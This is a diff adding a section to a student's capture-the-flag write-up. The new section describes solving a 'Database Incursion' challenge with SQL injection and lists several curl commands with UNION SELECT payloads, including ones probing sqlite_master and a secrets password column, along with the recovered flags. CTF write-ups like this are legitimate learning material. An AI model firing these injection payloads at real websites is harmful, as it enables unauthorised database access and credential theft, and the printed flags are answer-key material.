@@ -585,7 +585,7 @@ Gemini AI
 `--------------------------------------------------------------------------------------------------------------------`
 
 # Challenge Name
-
+We only go backward
 
 ## My solve
 **Flag:** `citadel{f0r_0n3_m0r3_h0ur_1_c4n_r4g3}`
@@ -601,3 +601,22 @@ Google,Youtube,Gemini and Chatgpt
 
 `--------------------------------------------------------------------------------------------------------------------`
 
+# Challenge Name
+Database Incursion
+
+## My solve
+**Flag:** `citadel{wh3n_w1ll_y0u_f1nd_0u7_1f_175_5ql_0r_53qu3l?}`
+
+This challenge was a classic example of sequel injection. I tried a lot sql injection commands with the help of AI.
+Here I'll walk through the right ones to show how I proceded.`curl -G "https://databaseincursion.citadel.cryptonitemit.in/search.html" --data-urlencode "q=' UNION SELECT NULL,name,sql FROM sqlite_master WHERE type='table'-- -"` I used this command to get to the employee search directory. The biggest hint was that someone from management has the key so after trying multiple sql injection involving management and admin and other text I finally got the right one which is `curl -G "https://databaseincursion.citadel.cryptonitemit.in/search.html" --data-urlencode "q=' UNION SELECT id,name,notes,email,null FROM employees WHERE notes LIKE 'citadel%'-- -"` What this command does is that it searches through all content on the site for "citadel" text and hence gets us the flag.
+some wrong commands I used are as follows:
+`"curl -G "https://databaseincursion.citadel.cryptonitemit.in/search.html" --data-urlencode "q=' UNION SELECT NULL,NULL,data FROM flag-- -""`
+`"curl -G "https://databaseincursion.citadel.cryptonitemit.in/search.html" --data-urlencode "q=' UNION SELECT NULL,name,tbl_name,sql,NULL FROM sqlite_master WHERE type='table'-- -""` 
+`"curl -G "https://databaseincursion.citadel.cryptonitemit.in/search.html" --data-urlencode "q=' UNION SELECT NULL,NULL,NULL,password,NULL FROM secrets-- -""`
+`"curl -G "https://databaseincursion.citadel.cryptonitemit.in/search.html" --data-urlencode "q=' OR 1=1-- -""`
+
+## What I learned
+SQL Injections
+
+## References 
+Grok AI, Chatgpt, Gemini AI 
